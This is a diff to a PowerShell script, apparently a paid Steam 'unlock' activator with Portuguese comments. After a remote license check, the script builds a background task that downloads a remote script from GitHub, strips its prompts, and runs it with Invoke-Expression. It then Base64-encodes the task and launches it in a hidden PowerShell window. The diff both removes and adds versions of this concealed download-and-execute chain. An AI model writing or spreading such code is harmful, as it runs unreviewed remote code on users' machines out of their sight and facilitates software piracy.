@@ -18,45 +18,56 @@ try {
     $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"
 
     if ($auth.status -eq "authorized") {
-        
+
         [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")
 
         $bgTask = @'
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        
-        try {
-            # Baixa script original
-            $s = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
-            
-            # --- O APAGADOR CORINGA ---
-            
-            # 1. Encontra qualquer variação de "[System.Console]::ReadKey(...)" e transforma em um "0" silencioso
-            $s = $s -replace '\[.*?\]::ReadKey\(.*?\)', '0'
-            
-            # 2. Encontra qualquer variação de "[Console]::KeyAvailable" e transforma em "$false"
-            $s = $s -replace '\[.*?\]::KeyAvailable', '$false'
-            
-            # 3. Zera o timer do Millennium para ele não ficar esperando à toa
-            $s = $s -replace '\$milleniumTimer\s*=\s*\d+', '$milleniumTimer = 0'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-            # Executa a instalação
-            Invoke-Expression $s
+try {
+    $rawScript = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
 
-            # Baixa o aviso e abre no notepad
-            $wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
-            $path = "$env:TEMP\warning.txt"
-            (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
-            Start-Process notepad.exe $path
-            
-        } catch {
-            # Falha silenciosa em background
+    # ✅ \ simples — here-string de aspas simples é 100% literal
+    $linhas = $rawScript -split '\r?\n'
+    $scriptLimpo = @()
+
+    foreach ($linha in $linhas) {
+
+        if ($linha -match 'ReadKey') {
+            $scriptLimpo += 'Start-Sleep -Seconds 2'
+            continue
         }
+
+        if ($linha -match 'KeyAvailable') {
+            $scriptLimpo += 'if ($false) {'
+            continue
+        }
+
+        # ✅ \s*= com \ simples
+        if ($linha -match 'milleniumTimer\s*=') {
+            $scriptLimpo += '$milleniumTimer = 0'
+            continue
+        }
+
+        $scriptLimpo += $linha
+    }
+
+    $s = $scriptLimpo -join "`n"
+
+    Invoke-Expression $s
+
+    $wUrl = 'https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt'
+    $path = "$env:TEMP\warning.txt"
+    (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
+    Start-Process notepad.exe $path
+
+} catch {}
 '@
 
         $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
-        
+
         Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden
-        
+
         exit
 
     } else {
